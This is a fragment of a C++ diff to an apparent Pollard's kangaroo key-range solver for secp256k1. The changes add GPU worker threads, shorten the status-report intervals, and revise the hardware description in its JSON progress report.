+        if (g_state.num_threads <= 0) {
+            g_state.num_threads = (int)std::thread::hardware_concurrency();
+            if (g_state.num_threads <= 0) g_state.num_threads = 4;
+        }
+        for (int i = 0; i < g_state.num_threads; ++i) {
+            if (is_wild_mode) {
+                workers.emplace_back(WorkerWildThread, i, &secp, &jt, DEFAULT_DP_BITS, target_pub, range_min, range_max);
+            } else {
+                workers.emplace_back(WorkerTameThread, i, &secp, &jt, DEFAULT_DP_BITS, range_min, range_max);
+            }
         }
     }
 
     auto last_report_time = std::chrono::steady_clock::now();
     uint64_t last_steps = 0;
 
-    // Master dispatcher loop
     while (g_state.running) {
-        std::this_thread::sleep_for(std::chrono::seconds(10));
+        std::this_thread::sleep_for(std::chrono::seconds(5));
         auto now = std::chrono::steady_clock::now();
         double elapsed_sec = std::chrono::duration<double>(now - last_report_time).count();
 
-        if (elapsed_sec >= 30.0) {
+        if (elapsed_sec >= 15.0) {
             uint64_t cur_steps = g_state.total_steps.load();
             double hashrate_mhs = ((cur_steps - last_steps) / elapsed_sec) / 1000000.0;
             last_steps = cur_steps;
@@ -776,7 +799,15 @@ int main(int argc, char **argv) {
             std::ostringstream ss;
             ss << "{";
             ss << "\"worker_id\":\"" << g_state.worker_id << "\",";
-            std::string hw_info = g_state.use_gpu ? "NVIDIA CUDA GPU (JeanLucPons Native)" : ("CPU " + std::to_string(g_state.num_threads) + " Cores (" + std::to_string(g_state.num_threads * CPU_GRP_SIZE) + " Kangaroos Herd)");
+            std::string hw_info;
+            if (g_state.use_gpu) {
+                hw_info = "NVIDIA CUDA GPU #" + std::to_string(g_state.gpu_device_id) + " (Active CUDA Kernel)";
+                if (g_state.num_threads > 0) {
+                    hw_info += " + " + std::to_string(g_state.num_threads) + " CPU Cores";
+                }
+            } else {
+                hw_info = "CPU " + std::to_string(g_state.num_threads) + " Cores (L1-Optimized)";
+            }
             ss << "\"hardware\":\"" << hw_info << "\",";
             ss << "\"hashrate\":\"" << std::fixed << std::setprecision(2) << hashrate_mhs << " MH/s\",";
             ss << "\"count\":" << batch.size() << ",";
@@ -809,8 +840,16 @@ int main(int argc, char **argv) {
                 }
                 is_wild_mode = true;
                 g_state.running = true;
-                for (int i = 0; i < g_state.num_threads; ++i) {
-                    workers.emplace_back(WorkerWildThread, i, &secp, &jt, DEFAULT_DP_BITS, target_pub);
+
+#ifdef USE_CUDA
+                if (g_state.use_gpu) {
+                    workers.emplace_back(WorkerGpuThread, g_state.gpu_device_id, &secp, &jt, DEFAULT_DP_BITS, is_wild_mode, range_min, range_max, target_pub);
+                }
+#endif
+                if (!g_state.use_gpu || g_state.num_threads > 0) {
+                    for (int i = 0; i < g_state.num_threads; ++i) {
+                        workers.emplace_back(WorkerWildThread, i, &secp, &jt, DEFAULT_DP_BITS, target_pub, range_min, range_max);
+                    }
                 }
             }
         }
